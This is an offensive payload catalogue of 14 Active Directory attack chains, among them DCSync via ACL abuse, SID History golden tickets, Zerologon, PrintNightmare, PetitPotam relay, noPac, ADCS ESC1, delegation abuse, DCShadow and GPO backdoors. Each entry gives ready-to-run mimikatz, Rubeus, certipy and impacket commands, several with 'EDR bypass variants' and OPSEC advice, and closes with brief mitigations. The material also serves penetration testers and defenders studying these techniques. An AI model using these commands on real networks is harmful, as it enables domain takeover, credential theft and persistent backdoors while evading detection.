# Domain Penetration Attacks

_14 intranet payloads_

### Domain Privilege Escalation Path  `domain-privilege-escalation`
_Exploiting ACL misconfiguration for domain privilege escalation_
Subcategory: **Privilege Escalation** · tags: `acl` `privilege` `active-directory` `escalation`

**Prerequisites:**
- Domain environment
- Regular domain user credentials
- BloodHound analysis results

**Attack chain:**

**BloodHound analysis**
> Query the shortest path to Domain Admins
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**Find WriteDACL**
> Find WriteDACL permission
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**Exploit WriteDACL**
> Add DCSync permission
_platform: windows_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**Execute DCSync**
> Execute DCSync to obtain domain admin hash
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**Find GenericAll**
> Find GenericAll permission
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**Reset password**
> Reset target user's password
_platform: windows_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR bypass variant:**

**Stealthy operation**
> Specify domain controller for operation
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```

**Analysis:** Domain ACL misconfiguration is a common privilege escalation path, discoverable via BloodHound.

**OPSEC tips:**
- ACL modifications generate logs
- Prefer stealthy permissions
- BloodHound can reveal attack paths

**Overview:** ACL misconfiguration in Active Directory allows low-privilege users to obtain high privileges.

**Vulnerability principle:** ACL misconfiguration in AD may allow low-privilege users to modify properties or permissions of high-privilege objects.

**Exploitation method:** Exploitation process: 1) Analyze with BloodHound; 2) Discover ACL attack path; 3) Exploit for privilege escalation; 4) Obtain high privileges.

**Mitigations:** Mitigations: 1) Regularly audit ACL configuration; 2) Principle of least privilege; 3) Monitor ACL modifications; 4) Deploy anomaly detection.

---

### Cross-Domain Trust Attack  `domain-cross-trust`
_Exploiting domain trust relationships for cross-domain attacks_
Subcategory: **Cross-Domain Attack** · tags: `trust` `cross-domain` `active-directory` `forest`

**Prerequisites:**
- Already obtained privileges in the source domain
- Domain trust relationship exists
- Target domain information

**Attack chain:**

**Enumerate trust relationships**
> Enumerate domain trust relationships
_platform: windows_
```
Get-NetDomainTrust
```

**Enumerate forest trusts**
> Enumerate forest trust relationships
_platform: windows_
```
Get-NetForestTrust
```

**Cross-domain user enumeration**
> Enumerate users in the target domain
_platform: windows_
```
Get-NetUser -Domain target.domain.com
```

**Cross-domain group enumeration**
> Enumerate groups in the target domain
_platform: windows_
```
Get-NetGroup -Domain target.domain.com
```

**SID History attack**
> Exploit SID History for cross-domain privilege escalation
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```
**Syntax breakdown:**
- `/sids` — Add the target domain's SID _parameter_
- `519` — RID of the Enterprise Admins group _value_

**Cross-domain ticket**
> Request a ticket for the target domain
_platform: windows_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR bypass variant:**

**Stealthy cross-domain**
> Specify target domain controller for enumeration
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```

**Analysis:** Cross-domain trust attacks can exploit trust relationships to move from a lower-security domain to a higher-security domain.

**OPSEC tips:**
- Cross-domain attacks generate logs
- SID History requires special privileges
- Forest trust is safer

**Overview:** Domain trust relationships allow cross-domain access; attackers can exploit trust relationships for lateral movement.

**Vulnerability principle:** Domain trust relationships may allow an attacker to access resources in another domain from one domain; SID History can be used for cross-domain privilege escalation.

**Exploitation method:** Exploitation process: 1) Enumerate trust relationships; 2) Analyze trust type; 3) Exploit the trust relationship; 4) Move laterally across domains.

**Mitigations:** Mitigations: 1) Audit trust relationships; 2) Use selective authentication; 3) Monitor cross-domain activity; 4) Regularly review SID History.

---

### Zerologon Attack  `zerologon`
_CVE-2020-1472 Netlogon privilege escalation_
Subcategory: **Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**Prerequisites:**
- Access to the domain controller's RPC

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
python zerologon_tester.py DC_NAME DC_IP
Check whether the vulnerability exists
```

**Exploit vulnerability**
> Exploit vulnerability
_platform: linux_
```
python zerologon_exploit.py DC_NAME DC_IP
Set the DC password to empty
```
**Syntax breakdown:**
- `zerologon_exploit.py` — Exploit script _keyword_
- `DC_NAME` — Domain controller name _keyword_

**Dump hashes**
> Dump hashes
_platform: linux_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
Dump all hashes in the domain
```

**Restore password**
> Restore password
_platform: linux_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
Restore the DC password to avoid causing damage
```

**Overview:** Zerologon can reset the domain controller's password to empty.

**Vulnerability principle:** Encryption flaw in the Netlogon protocol.

**Exploitation method:** Exploitation process: 1) Detect vulnerability 2) Reset password 3) Dump hashes 4) Restore password

**Mitigations:** Mitigations: 1) Install patch 2) Enforce secure RPC 3) Monitor for anomalous logins

---

### PrintNightmare Attack  `printnightmare`
_CVE-2021-34527 print spooler service vulnerability_
Subcategory: **PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**Prerequisites:**
- Access to the print spooler service RPC

**Attack chain:**

**Detect vulnerability**
> Detect print spooler service
_platform: linux_
```
rpcdump.py @DC_IP | grep MS-RPRN
Check whether the print spooler service is available
```

**Exploit vulnerability**
> Exploit vulnerability
_platform: linux_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
Load malicious DLL to obtain SYSTEM privileges
```
**Syntax breakdown:**
- `-target` — Target IP _parameter_
- `-payload` — Malicious DLL path _parameter_

**Impacket exploitation**
> Use Impacket
_platform: linux_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
Trigger loading of a remote DLL
```

**Overview:** PrintNightmare allows remote code execution.

**Vulnerability principle:** The print spooler service has a remote code execution vulnerability.

**Exploitation method:** Exploitation process: 1) Detect print spooler service 2) Construct malicious DLL 3) Trigger loading

**Mitigations:** Mitigations: 1) Install patch 2) Disable print spooler service 3) Network segmentation

---

### PetitPotam Attack  `petitpotam`
_CVE-2021-36942 forced authentication attack_
Subcategory: **PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**Prerequisites:**
- Access to the EFSRPC interface

**Attack chain:**

**Start relay**
> Start NTLM relay
_platform: linux_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
Set up NTLM relay to ADCS
```

**Trigger authentication**
> Trigger authentication
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
Force the DC to authenticate to the attacker
```
**Syntax breakdown:**
- `petitpotam.py` — PetitPotam exploit script _keyword_
- `attacker_ip` — Relay server IP _keyword_

**Obtain certificate**
> Obtain certificate
_platform: linux_
```
After a successful relay, obtain the user's certificate
Use the certificate for Pass-the-Cert
```

**Overview:** PetitPotam can force machine account authentication.

**Vulnerability principle:** The EFSRPC interface can be abused.

**Exploitation method:** Exploitation process: 1) Start relay 2) Trigger authentication 3) Relay to ADCS

**Mitigations:** Mitigations: 1) Install patch 2) Disable EFSRPC 3) Protect ADCS

---

### noPac/SAMAccountName Attack  `samaccountname`
_CVE-2021-42278/CVE-2021-42287 domain privilege escalation_
Subcategory: **noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**Prerequisites:**
- Regular domain user privileges

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
Check whether the vulnerability exists
```

**Exploit vulnerability**
> Exploit vulnerability
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
Obtain domain admin privileges
```
**Syntax breakdown:**
- `-dc-ip` — Domain controller IP _parameter_
- `-shell` — Obtain a shell _parameter_

**Attack principle**
> Attack principle
```
1. Create a machine account (name resembling a DC)
2. Clear the SPN
3. Request a TGT
4. Delete the machine account
5. Obtain a domain admin TGT
```

**Overview:** noPac can escalate from a regular user to domain administrator.

**Vulnerability principle:** SAM-Account-Name spoofing and PAC validation flaw.

**Exploitation method:** Exploitation process: 1) Create machine account 2) Clear SPN 3) Obtain domain admin TGT

**Mitigations:** Mitigations: 1) Install patch 2) Restrict machine account creation 3) Monitor for anomalous accounts

---

### ADCS Abuse Attack  `adcs-abuse`
_Active Directory Certificate Services abuse_
Subcategory: **ADCS** · tags: `adcs` `certificate` `domain`

**Prerequisites:**
- ADCS service accessible

**Attack chain:**

**Enumerate ADCS**
> Enumerate ADCS configuration
_platform: linux_
```
certipy find -u user@domain -p password -dc-ip DC_IP
Enumerate certificate templates
```

**Request user certificate**
> Request certificate
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
Request a user certificate
```
**Syntax breakdown:**
- `certipy req` — Request certificate command _keyword_
- `-ca` — Certificate authority _parameter_
- `-template` — Certificate template _parameter_

**Pass-the-Cert**
> Authenticate using certificate
_platform: linux_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
Use the certificate to obtain a TGT
```

**Rubeus request**
> Rubeus exploitation
_platform: windows_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
Use Rubeus to request a TGT
```

**Overview:** ADCS can be abused to obtain user certificates for authentication.

**Vulnerability principle:** Improperly configured certificate templates.

**Exploitation method:** Exploitation process: 1) Enumerate ADCS 2) Request certificate 3) Pass-the-Cert

**Mitigations:** Mitigations: 1) Audit certificate templates 2) Restrict template permissions 3) Monitor certificate requests

---

### ADCS ESC1 Vulnerability  `adcs-esc1`
_Certificate template ESC1 abuse_
Subcategory: **ADCS** · tags: `adcs` `esc1` `certificate`

**Prerequisites:**
- A template with ESC1 configuration exists

**Attack chain:**

**Identify ESC1**
> Identify vulnerable template
_platform: linux_
```
certipy find -u user@domain -p password -vulnerable
Find ESC1-vulnerable templates
```

**Exploit ESC1**
> Request a domain admin certificate
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
Specify a domain admin as the SAN
```
**Syntax breakdown:**
- `-alt` — Specify Subject Alternative Name _parameter_
- `admin@domain` — Target user UPN _value_

**Authenticate as domain admin**
> Authenticate as domain admin
_platform: linux_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
Authenticate as domain admin using the certificate
```

**Overview:** ESC1 allows specifying an arbitrary SAN in a certificate request.

**Vulnerability principle:** The template allows the user to specify the SAN and can be used for client authentication.

**Exploitation method:** Exploitation process: 1) Find ESC1 template 2) Specify domain admin SAN 3) Obtain domain admin certificate

**Mitigations:** Mitigations: 1) Disable SAN specification 2) Restrict template permissions 3) Monitor certificate requests

---

### Constrained Delegation Attack  `constrained-delegation`
_Exploiting constrained delegation for lateral movement_
Subcategory: **Delegation Attack** · tags: `delegation` `constrained` `kerberos`

**Prerequisites:**
- An account with constrained delegation configuration exists

**Attack chain:**

**Find constrained delegation**
> Find accounts with constrained delegation
_platform: windows_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
Or
BloodHound query
```

**Obtain service ticket**
> S4U2Self + S4U2Proxy
_platform: windows_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
Obtain a domain admin's service ticket
```
**Syntax breakdown:**
- `s4u` — S4U extension _keyword_
- `/impersonateuser` — User to impersonate _parameter_
- `/msdsspn` — Target service SPN _parameter_

**Use ticket**
> Inject ticket
_platform: windows_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
Inject the ticket and access the service
```

**Overview:** Constrained delegation allows an account to impersonate a user to access a specific service.

**Vulnerability principle:** Constrained delegation configuration can be abused.

**Exploitation method:** Exploitation process: 1) Find delegation account 2) Obtain ticket via S4U 3) Access target service

**Mitigations:** Mitigations: 1) Audit delegation configuration 2) Use Protected Users group 3) Monitor S4U requests

---

### Resource-Based Constrained Delegation  `resource-delegation`
_Exploiting RBCD for privilege escalation_
Subcategory: **Delegation Attack** · tags: `rbcd` `delegation` `kerberos`

**Prerequisites:**
- WriteDACL permission on the target object

**Attack chain:**

**Create machine account**
> Create machine account
_platform: windows_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
Create a new machine account
```

**Configure RBCD**
> Configure RBCD
_platform: windows_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
Set the delegation relationship
```
**Syntax breakdown:**
- `PrincipalsAllowedToDelegateToAccount` — Accounts allowed to delegate _keyword_

**Exploit RBCD**
> Exploit RBCD
_platform: windows_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
Obtain a domain admin ticket
```

**Overview:** RBCD allows configuring a delegation relationship from the target object.

**Vulnerability principle:** WriteDACL permission on an object allows configuring RBCD.

**Exploitation method:** Exploitation process: 1) Create machine account 2) Configure RBCD 3) Obtain high-privilege ticket

**Mitigations:** Mitigations: 1) Audit ACL permissions 2) Protect critical objects 3) Monitor RBCD configuration

---

### DCShadow Attack  `dcshadow-attack`
_Impersonate a domain controller to inject data_
Subcategory: **DCShadow** · tags: `dcshadow` `domain` `injection`

**Prerequisites:**
- Domain administrator privileges
- Ability to register a new DC

**Attack chain:**

**Register fake DC**
> Register fake DC
_platform: windows_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
Register a fake DC and modify object attributes
```
**Syntax breakdown:**
- `lsadump::dcshadow` — DCShadow module _command_
- `/object` — Target object DN _parameter_
- `/attribute` — Attribute to modify _parameter_

**Push changes**
> Push changes
_platform: windows_
```
In another terminal:
mimikatz # lsadump::dcshadow /push
Push changes to the real DC
```

**Common exploitation**
> Common exploitation scenarios
_platform: windows_
```
Modify user group:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
Add SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```

**Overview:** DCShadow can impersonate a DC to inject data into a real DC.

**Vulnerability principle:** The AD replication mechanism can be abused.

**Exploitation method:** Exploitation process: 1) Obtain domain admin privileges 2) Register fake DC 3) Push malicious data

**Mitigations:** Mitigations: 1) Monitor DC registration 2) Audit replication events 3) Protect domain admin accounts

---

### Group Policy Abuse  `group-policy-abuse`
_Abusing group policy for lateral movement_
Subcategory: **Group Policy** · tags: `gpo` `group-policy` `domain`

**Prerequisites:**
- GPO edit permission

**Attack chain:**

**Find editable GPO**
> Find editable GPO
_platform: windows_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
Find GPOs editable by Domain Users
```

**Add scheduled task**
> Add scheduled task
_platform: windows_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
Add an immediately-executed scheduled task
```
**Syntax breakdown:**
- `New-GPOImmediateTask` — Create immediate task _keyword_
- `-GPODisplayName` — Target GPO name _parameter_

**Add registry entry**
> Add registry autorun entry
_platform: windows_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```

**Overview:** Group policy can be abused to execute code on target machines.

**Vulnerability principle:** The user has edit permission on the GPO.

**Exploitation method:** Exploitation process: 1) Find editable GPO 2) Add malicious configuration 3) Wait for application

**Mitigations:** Mitigations: 1) Audit GPO permissions 2) Monitor GPO changes 3) Restrict edit permissions

---

### SAM The Admin Attack  `sam-the-admin`
_CVE-2021-42278/CVE-2021-42287 domain privilege escalation_
Subcategory: **SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**Prerequisites:**
- Domain user privileges
- Domain controller has the vulnerability

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
Check whether the vulnerability exists
```

**Exploit vulnerability**
> Obtain domain controller privileges
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
Obtain a SYSTEM shell
```
**Syntax breakdown:**
- `CVE-2021-42278` — sAMAccountName spoofing _keyword_
- `CVE-2021-42287` — Kerberos PAC validation bypass _keyword_

**Execute command**
> Execute command
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```

**Overview:** SAM The Admin exploits sAMAccountName spoofing and PAC validation bypass for privilege escalation.

**Vulnerability principle:** The domain controller does not have the relevant patch installed.

**Exploitation method:** Exploitation process: 1) Create machine account 2) Modify sAMAccountName 3) Request TGT 4) Delete account 5) Request S4U2Self

**Mitigations:** Mitigations: 1) Install KB5008102 patch 2) Monitor for anomalous account creation 3) Audit sAMAccountName modifications

---

### NoAuth Attack  `noauth`
_CVE-2022-33679 Kerberos authentication bypass_
Subcategory: **NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**Prerequisites:**
- Domain user privileges
- Target account has an RC4 key

**Attack chain:**

**Detect vulnerability**
> Detect vulnerability
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
Check whether the vulnerability exists
```

**Exploit vulnerability**
> Obtain TGT
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
Obtain the target user's TGT
```
**Syntax breakdown:**
- `CVE-2022-33679` — Kerberos RC4 weak validation _keyword_
- `RC4 key` — Exploit RC4 encryption type to bypass validation _keyword_

**Use TGT**
> Use the obtained TGT
_platform: linux_
```
Set the KRB5CCNAME environment variable
export KRB5CCNAME=administrator.ccache
Use tools such as psexec.py
```

**Overview:** NoAuth exploits a validation flaw in Kerberos RC4 encryption.

**Vulnerability principle:** Kerberos RC4 encryption validation has a flaw.

**Exploitation method:** Exploitation process: 1) Detect target's RC4 key 2) Construct malicious request 3) Obtain TGT

**Mitigations:** Mitigations: 1) Install patch 2) Disable RC4 encryption 3) Enforce AES encryption

---
